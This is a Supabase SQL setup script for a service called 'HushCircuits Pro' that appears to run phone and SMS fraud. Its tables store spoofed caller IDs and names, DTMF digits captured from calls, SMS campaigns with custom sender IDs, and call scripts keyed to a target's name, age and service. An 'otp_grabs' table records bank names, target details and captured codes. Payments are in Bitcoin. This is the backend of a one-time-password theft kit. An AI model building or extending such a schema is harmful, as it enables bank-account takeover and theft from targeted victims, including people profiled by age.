-- ============================================================
-- HushCircuits Pro — Supabase Complete Setup
-- Go to: https://supabase.com/dashboard/project/xhaffitwkcrobzcfrgsm/sql/new
-- Paste this entire file and click "Run"
-- ============================================================

-- 1. Disable email confirmation (no friction signup)
INSERT INTO auth.config (key, value)
VALUES ('DISABLE_SIGNUP', 'false')
ON CONFLICT (key) DO UPDATE SET value = 'false';

-- Also disable email confirmation via the config
UPDATE auth.config SET value = 'false' WHERE key = 'EMAIL_CONFIRM';

-- 2. Enable extensions
CREATE EXTENSION IF NOT EXISTS "pgcrypto";
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- 3. Profiles (auto-created on signup via trigger)
CREATE TABLE IF NOT EXISTS public.profiles (
  id UUID PRIMARY KEY REFERENCES auth.users(id) ON DELETE CASCADE,
  email TEXT DEFAULT '',
  phone TEXT DEFAULT '',
  balance DOUBLE PRECISION DEFAULT 0.0,
  is_vip BOOLEAN DEFAULT false,
  vip_expires_at TIMESTAMPTZ DEFAULT NULL,
  tokens_used BIGINT DEFAULT 0,
  total_calls BIGINT DEFAULT 0,
  referral_code TEXT DEFAULT encode(gen_random_bytes(6), 'hex'),
  referred_by TEXT DEFAULT NULL,
  first_deposit BOOLEAN DEFAULT false,
  onboarding_completed BOOLEAN DEFAULT false,
  is_admin BOOLEAN DEFAULT false,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- 4. Auto-create profile on signup
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO public.profiles (id, email)
  VALUES (NEW.id, NEW.email);
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

DROP TRIGGER IF EXISTS on_auth_user_created ON auth.users;
CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();

-- 5. Calls
CREATE TABLE IF NOT EXISTS public.calls (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
  spoofed_caller_id TEXT NOT NULL,
  spoofed_name TEXT DEFAULT '',
  destination_number TEXT NOT NULL,
  status TEXT DEFAULT 'pending',
  duration_seconds INT DEFAULT 0,
  tokens_cost INT DEFAULT 0,
  cost_usd DOUBLE PRECISION DEFAULT 0.0,
  cnam_result TEXT DEFAULT '',
  trunk_used TEXT DEFAULT '',
  recording_url TEXT DEFAULT '',
  dtmf_captured TEXT DEFAULT '',
  hangup_cause TEXT DEFAULT '',
  created_at TIMESTAMPTZ DEFAULT NOW(),
  ended_at TIMESTAMPTZ DEFAULT NULL
);

-- 6. DTMF Logs
CREATE TABLE IF NOT EXISTS public.dtmf_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  call_id UUID REFERENCES public.calls(id) ON DELETE CASCADE,
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
  digit TEXT NOT NULL,
  timestamp_ms INT DEFAULT 0,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 7. SMS Campaigns
CREATE TABLE IF NOT EXISTS public.sms_campaigns (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
  sender_id TEXT NOT NULL,
  content TEXT NOT NULL,
  targets INT DEFAULT 0,
  sent_count INT DEFAULT 0,
  status TEXT DEFAULT 'draft',
  cost_tokens INT DEFAULT 0,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 8. SMS Logs
CREATE TABLE IF NOT EXISTS public.sms_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  campaign_id UUID REFERENCES public.sms_campaigns(id) ON DELETE SET NULL,
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
  phone_number TEXT NOT NULL,
  content TEXT NOT NULL,
  sender_id TEXT NOT NULL,
  message_id TEXT DEFAULT '',
  status TEXT DEFAULT 'pending',
  error TEXT DEFAULT '',
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 9. Scripts
CREATE TABLE IF NOT EXISTS public.scripts (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
  title TEXT DEFAULT '',
  target_name TEXT DEFAULT '',
  target_age INT DEFAULT 0,
  target_service TEXT DEFAULT '',
  target_details TEXT DEFAULT '',
  goal TEXT DEFAULT '',
  script_type TEXT DEFAULT 'custom',
  content TEXT NOT NULL,
  tokens_cost INT DEFAULT 0,
  is_library BOOLEAN DEFAULT false,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 10. Transactions
CREATE TABLE IF NOT EXISTS public.transactions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
  type TEXT NOT NULL,
  amount DOUBLE PRECISION DEFAULT 0.0,
  tokens INT DEFAULT 0,
  currency TEXT DEFAULT 'USD',
  status TEXT DEFAULT 'pending',
  reference TEXT DEFAULT '',
  description TEXT DEFAULT '',
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 11. Vouchers
CREATE TABLE IF NOT EXISTS public.vouchers (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  code TEXT UNIQUE NOT NULL,
  tokens INT NOT NULL,
  is_used BOOLEAN DEFAULT false,
  used_by UUID REFERENCES public.profiles(id) ON DELETE SET NULL,
  created_by UUID REFERENCES public.profiles(id) ON DELETE SET NULL,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  used_at TIMESTAMPTZ DEFAULT NULL
);

-- 12. Payments
CREATE TABLE IF NOT EXISTS public.payments (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
  payment_id TEXT UNIQUE,
  currency TEXT DEFAULT 'BTC',
  amount DOUBLE PRECISION DEFAULT 0.0,
  tokens INT DEFAULT 0,
  status TEXT DEFAULT 'pending',
  pay_address TEXT DEFAULT '',
  pay_amount DOUBLE PRECISION DEFAULT 0.0,
  txid TEXT DEFAULT '',
  created_at TIMESTAMPTZ DEFAULT NOW(),
  confirmed_at TIMESTAMPTZ DEFAULT NULL
);

-- 13. Referrals
CREATE TABLE IF NOT EXISTS public.referrals (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  referrer_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
  referred_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
  bonus_tokens INT DEFAULT 0,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 14. User Webhooks
CREATE TABLE IF NOT EXISTS public.user_webhooks (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
  url TEXT NOT NULL,
  events TEXT[] DEFAULT '{}',
  is_active BOOLEAN DEFAULT true,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 15. OTP Grabs
CREATE TABLE IF NOT EXISTS public.otp_grabs (
  id TEXT PRIMARY KEY,
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE,
  status TEXT DEFAULT 'pending',
  phone_number TEXT NOT NULL,
  bank_name TEXT DEFAULT '',
  target_name TEXT DEFAULT '',
  target_age INT DEFAULT 0,
  spoofed_caller_id TEXT DEFAULT '',
  sender_id TEXT DEFAULT '',
  call_id UUID DEFAULT NULL,
  dtmf_captured TEXT DEFAULT '',
  error TEXT DEFAULT '',
  sms_sent BOOLEAN DEFAULT false,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- 16. User Settings
CREATE TABLE IF NOT EXISTS public.user_settings (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE UNIQUE,
  country_code TEXT DEFAULT '+1',
  webhook_url TEXT DEFAULT '',
  ringtone TEXT DEFAULT 'default',
  vibrate BOOLEAN DEFAULT true,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- 17. Indexes
CREATE INDEX IF NOT EXISTS idx_profiles_email ON public.profiles(email);
CREATE INDEX IF NOT EXISTS idx_calls_user_id ON public.calls(user_id);
CREATE INDEX IF NOT EXISTS idx_calls_created_at ON public.calls(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_dtmf_logs_call_id ON public.dtmf_logs(call_id);
CREATE INDEX IF NOT EXISTS idx_sms_logs_user_id ON public.sms_logs(user_id);
CREATE INDEX IF NOT EXISTS idx_scripts_user_id ON public.scripts(user_id);
CREATE INDEX IF NOT EXISTS idx_transactions_user_id ON public.transactions(user_id);
CREATE INDEX IF NOT EXISTS idx_payments_user_id ON public.payments(user_id);
CREATE INDEX IF NOT EXISTS idx_vouchers_code ON public.vouchers(code);
CREATE INDEX IF NOT EXISTS idx_otp_grabs_user_id ON public.otp_grabs(user_id);

-- ============================================================
-- 18. Row Level Security (RLS)
-- Users can ONLY see/modify their own data
-- ============================================================
ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.calls ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.dtmf_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.sms_campaigns ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.sms_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.scripts ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.transactions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.vouchers ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.payments ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.referrals ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.user_webhooks ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.otp_grabs ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.user_settings ENABLE ROW LEVEL SECURITY;

-- Profiles
DROP POLICY IF EXISTS "Users can view own profile" ON public.profiles;
CREATE POLICY "Users can view own profile" ON public.profiles
  FOR SELECT USING (auth.uid() = id);
DROP POLICY IF EXISTS "Users can update own profile" ON public.profiles;
CREATE POLICY "Users can update own profile" ON public.profiles
  FOR UPDATE USING (auth.uid() = id);

-- Calls
DROP POLICY IF EXISTS "Users can view own calls" ON public.calls;
CREATE POLICY "Users can view own calls" ON public.calls
  FOR SELECT USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can insert own calls" ON public.calls;
CREATE POLICY "Users can insert own calls" ON public.calls
  FOR INSERT WITH CHECK (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can update own calls" ON public.calls;
CREATE POLICY "Users can update own calls" ON public.calls
  FOR UPDATE USING (auth.uid() = user_id);

-- DTMF Logs
DROP POLICY IF EXISTS "Users can view own dtmf" ON public.dtmf_logs;
CREATE POLICY "Users can view own dtmf" ON public.dtmf_logs
  FOR SELECT USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can insert own dtmf" ON public.dtmf_logs;
CREATE POLICY "Users can insert own dtmf" ON public.dtmf_logs
  FOR INSERT WITH CHECK (auth.uid() = user_id);

-- SMS
DROP POLICY IF EXISTS "Users can view own sms" ON public.sms_logs;
CREATE POLICY "Users can view own sms" ON public.sms_logs
  FOR SELECT USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can insert own sms" ON public.sms_logs;
CREATE POLICY "Users can insert own sms" ON public.sms_logs
  FOR INSERT WITH CHECK (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can view own campaigns" ON public.sms_campaigns;
CREATE POLICY "Users can view own campaigns" ON public.sms_campaigns
  FOR SELECT USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can insert own campaigns" ON public.sms_campaigns;
CREATE POLICY "Users can insert own campaigns" ON public.sms_campaigns
  FOR INSERT WITH CHECK (auth.uid() = user_id);

-- Scripts
DROP POLICY IF EXISTS "Users can view own scripts" ON public.scripts;
CREATE POLICY "Users can view own scripts" ON public.scripts
  FOR SELECT USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can insert own scripts" ON public.scripts;
CREATE POLICY "Users can insert own scripts" ON public.scripts
  FOR INSERT WITH CHECK (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can delete own scripts" ON public.scripts;
CREATE POLICY "Users can delete own scripts" ON public.scripts
  FOR DELETE USING (auth.uid() = user_id);

-- Transactions
DROP POLICY IF EXISTS "Users can view own transactions" ON public.transactions;
CREATE POLICY "Users can view own transactions" ON public.transactions
  FOR SELECT USING (auth.uid() = user_id);

-- Payments
DROP POLICY IF EXISTS "Users can view own payments" ON public.payments;
CREATE POLICY "Users can view own payments" ON public.payments
  FOR SELECT USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can insert own payments" ON public.payments;
CREATE POLICY "Users can insert own payments" ON public.payments
  FOR INSERT WITH CHECK (auth.uid() = user_id);

-- OTP Grabs
DROP POLICY IF EXISTS "Users can view own otp_grabs" ON public.otp_grabs;
CREATE POLICY "Users can view own otp_grabs" ON public.otp_grabs
  FOR SELECT USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can insert own otp_grabs" ON public.otp_grabs;
CREATE POLICY "Users can insert own otp_grabs" ON public.otp_grabs
  FOR INSERT WITH CHECK (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can update own otp_grabs" ON public.otp_grabs;
CREATE POLICY "Users can update own otp_grabs" ON public.otp_grabs
  FOR UPDATE USING (auth.uid() = user_id);

-- User Settings
DROP POLICY IF EXISTS "Users can view own settings" ON public.user_settings;
CREATE POLICY "Users can view own settings" ON public.user_settings
  FOR SELECT USING (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can insert own settings" ON public.user_settings;
CREATE POLICY "Users can insert own settings" ON public.user_settings
  FOR INSERT WITH CHECK (auth.uid() = user_id);
DROP POLICY IF EXISTS "Users can update own settings" ON public.user_settings;
CREATE POLICY "Users can update own settings" ON public.user_settings
  FOR UPDATE USING (auth.uid() = user_id);

-- Service role bypasses RLS (backend admin operations)
